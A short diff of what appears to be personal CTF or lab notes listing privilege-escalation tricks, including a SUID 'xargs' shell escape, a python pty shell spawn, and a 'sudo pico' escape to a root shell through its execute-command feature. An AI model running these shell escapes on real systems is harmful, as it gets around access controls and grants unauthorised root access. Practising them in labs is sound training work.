@@ -15,11 +15,11 @@ xargs -a /dev/null sh -p
 
 python -c 'import pty; pty.spawn("/home/lucky_shell")' - is random so needs lots of tries
 
-// fortuna and pico:
+// fortuna pico suid:
 
 sudo pico
-^R^X
-reset; s
+//execute with command:
+reset; sh 1>&0 2>&0
 
 //kairos and python repl:
 
